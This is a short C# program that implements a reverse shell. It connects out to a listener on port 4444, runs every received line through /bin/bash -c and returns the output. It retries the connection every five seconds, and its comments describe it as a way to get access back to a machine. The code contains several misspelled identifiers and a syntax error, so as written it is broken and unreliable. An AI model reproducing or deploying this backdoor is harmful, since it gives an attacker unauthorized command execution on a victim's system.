using System;
using System.IO;
using System.Dignostics;
using System.Net.Sockets;
using System.Threading;

class Program
{
static void Main(string[] args)
{
while (true)
{
try
{
	//this is the connections
using (TcpClinet client = new TcpClinet("localhost", 4444)) //its going to use the method to get in, if you want to use a different port because its block, change 4444 to an open port but its your return port. Remember that. 
{
using (Stream stream = client.GetStream())
{
using (StreamReader reader = new StreamReader(stream))
{
using (StreamWriter writer = new StreamWriter(stream))
{
while (true)
{
writer.Write("$ ");
writer.Flush();
string cmd = reader.ReadLine();

if (string.IsNullOrEmpty(cmd))
{
client.Close();
return;
}
else
{
// add the run command
//this is what will get you access back your machine
var cmdProcess = new Process
{StartingInfo = new ProcessStartInfo
	{
		FileName = "/bin/bash".
		Arguments = "-c \"" + cmd + "\"", 
		UseShellExecute = false,
		RedirectStandardOutput = true
}
};

cmdProcess.Start();

writer.Write(cmdProcess.StandardOutput.ReadToEnd());
writer.Flush();
}
}
}
}
}
catch (Exception ex) when (ex is SocketExeception || ex is IOException)
{
	//Network errors may happenm, but wait a few moments to reconnect
	Thread.Sleep(5000);
}
}
}
}


		
